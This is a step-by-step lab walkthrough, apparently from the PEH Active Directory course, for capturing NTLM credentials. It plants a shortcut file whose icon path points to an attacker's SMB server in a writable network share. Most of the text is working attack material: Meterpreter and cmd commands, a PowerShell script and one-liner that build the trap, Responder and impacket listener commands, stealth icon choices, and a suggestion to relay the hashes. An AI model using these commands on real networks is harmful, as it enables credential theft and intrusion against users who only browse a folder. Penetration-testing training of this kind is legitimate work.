# Capturing NTLM via Malicious `.lnk` Icons (PEH Active Directory Lab)

> **Disclaimer:** This document is for **educational use in the Practical Ethical Hacking (PEH) Active Directory lab** or other explicitly authorized lab environments. **Do not** use these techniques on networks you do not own or do not have written permission to test.

## Goal

From a foothold on a Windows host, plant a **malicious `.lnk`** (shortcut) in a **writable share**. The `.lnk`’s **IconLocation** is a **UNC path** to your attacker host, so when users **view** the folder in Explorer, their machine attempts to fetch the icon over SMB—**leaking NTLM credentials** to your listener.

> In production, writable shares on Domain Controllers are rare. In the **PEH AD lab** you may see a DC share like `\\HYDRA-DC\hackme` for practice. The exact technique works with **any writable share** that privileged users browse (file servers, departmental shares, “Public” folders, DFS paths).

---

## Prerequisites

- You have a **Meterpreter session** (Windows) on a lab host.
- You know a **target server** and **writable share** (e.g., `\\TARGET-SERVER\hackme`).
- Your attacker box (Kali) has **Responder** or **impacket-smbserver**.
- Network path from victim → attacker is reachable (no blocked SMB).

---

## High-Level Flow

1. Enumerate shares; confirm **write access**.
2. From the foothold, open **cmd** → start **PowerShell**.
3. Create a **`.lnk`** directly **in the share**; set `IconLocation` to `\\ATTACKER\icon\foo.ico`.
4. **Background** the interactive shell (keep session alive).
5. On Kali, run a **listener** (Responder or impacket SMB server).
6. Wait for a user to **browse the share** → SMB auth request hits your listener.

---

## Step-by-Step (with exact commands)

### 1) From Meterpreter → cmd shell

```text
meterpreter > shell
```

**List shares on a target server (DC in lab example):**
```cmd
net view \\TARGET-SERVER
```

**(Optional) Get share paths (PowerShell remoting may be blocked in some labs):**
```cmd
wmic /node:"TARGET-SERVER" share get name,path
```

### 2) Confirm write access to the target share

```cmd
net use Z: \\TARGET-SERVER\hackme /user:DOMAIN\username Password1
echo test > Z:\writetest.txt
net use Z: /delete
```

- If `writetest.txt` is created, you have write permissions.

### 3) Switch to PowerShell to create the `.lnk`

```cmd
powershell -NoProfile
```

**Paste the script (edit IP/paths):**
```powershell
# Attacker IP (your Kali box)
$attacker = "192.0.2.10"   # <-- change to your Kali IP

# Destination: UNC path to the writable share
$dest = "\\TARGET-SERVER\hackme\readme.lnk"

# Create the shortcut
$shell = New-Object -ComObject WScript.Shell
$lnk   = $shell.CreateShortcut($dest)
$lnk.TargetPath       = "cmd.exe"                  # harmless target
$lnk.Arguments        = "/c exit"
$lnk.WorkingDirectory = "$env:SystemRoot\System32"

# KEY: UNC icon path forces SMB authentication on folder view
$lnk.IconLocation     = "\\$attacker\icon\foo.ico"

$lnk.Description      = "Readme"
$lnk.Save()
```

> **Why this works:** Explorer resolves the custom icon by fetching `\\ATTACKER\icon\foo.ico`. That triggers an SMB authentication attempt to your box, where Responder/SMB server can capture NTLM.

### 4) **Background** PowerShell (don’t kill the session)

Press `CTRL+Z`, then:

```
Background session 1? [y/N]  y
```

You’re back at:

```
meterpreter >
```

> **Why background?** Keeps the interactive shell alive (and any mapped drives/env) so you can return without spawning a new shell.

### 5) Verify the `.lnk` exists

```text
meterpreter > shell
```

```cmd
dir \\TARGET-SERVER\hackme
```

You should see `readme.lnk`.

---

## Listener on Kali

**Responder** (capture hashes; also handles LLMNR/WPAD in labs):
```bash
sudo responder -I eth0 -dwv
```

- `-d` DHCP, `-w` WPAD, `-v` verbose. (Use the correct interface instead of `eth0`.)

**OR simple SMB server** (no poisoning; just serve `/tmp/icon`):
```bash
mkdir -p /tmp/icon
impacket-smbserver icon /tmp/icon -smb2support
```

When a user browses the share, the icon fetch `\\ATTACKER\icon\foo.ico` hits your listener.

---

## Choosing Believable Icons

Set `IconLocation` to something users expect, but keep the **UNC** to force SMB auth:

- **Custom `.ico` over UNC** (recommended for capture):  
  `\\ATTACKER\icons\doc.ico`
- **Default Windows DLLs** (if you don’t need capture):  
  `%SystemRoot%\System32\shell32.dll,3` (folder)  
  `%SystemRoot%\System32\shell32.dll,70` (gear)
- **Office application icons** (if present):  
  `%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0`

> For credential capture, keep the icon on your **attacker SMB share** (UNC). For stealth without capture, use local system DLL icons.

---

## Variations & Notes (PEH AD Lab)

- **Any writable share works** (file servers, “Public”, department shares). DC-hosted writable shares (like `\\HYDRA-DC\hackme`) exist mainly for **lab exercises**.
- You **do not** need the victim to **click** the `.lnk`. **Viewing** the folder triggers the icon fetch.
- Pair with **SMB relay** (`ntlmrelayx.py`) if SMB signing is disabled on targets you care about.
- Run your “passive traps” (Responder, relay) **in the background** while you continue other lab tasks.

---

## Troubleshooting

- **No file created / `DirectoryNotFoundException`**  
  Check the **real backing path** or UNC is correct; create the directory or use a valid share.
- **Impacket/Responder never sees traffic**  
  - Wrong **attacker IP** in `IconLocation`.  
  - Network path blocked from victim → attacker.  
  - You looked at the share from the **same machine** hosting the share (no SMB out).
- **User clicks but no creds captured**  
  If `IconLocation` points to a **local** DLL (e.g., `shell32.dll,70`), there’s **no SMB** to attacker. Use UNC for capture.
- **Access denied on share**  
  You don’t have write permissions. Try another share or different credentials.
- **EDR/AV interferes**  
  In some enterprise configs, SMB or icon fetches may be filtered/logged—expected in harder labs.

---

## One-Liners (Handy)

**Create `.lnk` in share (single line for `powershell_execute`):**
```powershell
$a='192.0.2.10';$d='\\\\TARGET-SERVER\\\\hackme\\\\readme.lnk';$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut($d);$l.TargetPath='cmd.exe';$l.Arguments='/c exit';$l.WorkingDirectory=$env:SystemRoot+'\\System32';$l.IconLocation='\\\\'+$a+'\\icon\\foo.ico';$l.Description='Readme';$l.Save()
```

**Meterpreter usage:**
```text
meterpreter > shell
net view \\TARGET-SERVER
net use Z: \\TARGET-SERVER\hackme /user:DOMAIN\username Password1
echo test > Z:\writetest.txt
net use Z: /delete
powershell -NoProfile
# paste script, then:
# CTRL+Z, y
meterpreter > shell
dir \\TARGET-SERVER\hackme
```

**Kali listener (Responder):**
```bash
sudo responder -I eth0 -dwv
```

**Kali SMB server (icon hosting):**
```bash
mkdir -p /tmp/icon
impacket-smbserver icon /tmp/icon -smb2support
```

---

## Ethical Use

This technique is part of the **PEH Active Directory lab** toolkit to demonstrate **post-exploitation credential harvesting**. Use only under **written authorization** and follow engagement scope, logging, and reporting requirements.

